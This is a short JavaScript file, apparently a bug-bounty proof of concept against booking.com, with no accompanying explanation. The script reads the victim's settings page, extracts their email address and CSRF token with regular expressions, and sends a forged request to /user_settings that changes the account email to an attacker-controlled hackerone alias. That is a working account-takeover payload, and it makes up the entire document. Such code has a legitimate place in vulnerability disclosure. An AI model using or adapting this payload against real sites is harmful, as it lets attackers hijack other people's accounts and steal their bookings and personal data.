var url = "/mysettings.de.html";
var xhr = new XMLHttpRequest();
    xhr.open("GET", url, true);
    xhr.onload = function (e) {
	if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            var page = xhr.responseText
            // 
	    var email = extractEmails(page);
	    var csrftoken = extractCsrf(page);
	    console.log("email", email)
	    console.log("CSRF", csrftoken)

            var http = new XMLHttpRequest();
		
                http.open("POST", "/user_settings", true);     
                http.setRequestHeader("Origin","https://secure.booking.com");
		http.setRequestHeader("Accept","application/json, text/javascript, */*; q=0.01");
		http.setRequestHeader("Connection","close");
		http.setRequestHeader("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36");
		http.setRequestHeader("Referer","https://secure.booking.com/");
		http.setRequestHeader("Sec-Fetch-Site","same-origin");
		http.setRequestHeader("Sec-Fetch-Dest","empty");
		http.setRequestHeader("Accept-Encoding","gzip, deflate");
		http.setRequestHeader("Sec-Fetch-Mode","cors");
		http.setRequestHeader("Accept-Language","en,es;q=0.9");
		http.setRequestHeader("X-Booking-CSRF",csrftoken);
	        
		http.onreadystatechange = function() {
    		if(http.readyState == 4 && http.status == 200) {
        	console.info(http.status);
        	console.info(http.responseText);
    		}
	}
	http.send('{"email":[{"op":"email_u","new_email":"zonduu+attacker@wearehackerone.com","email":"'+email+'"}]}');
		}
	}

function extractEmails (text){
    return text.match(/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/i)[0];
}
function extractCsrf (text){
    return text.match(/b_csrf_token: '([^']+)'/)[1];
}

xhr.send(null);
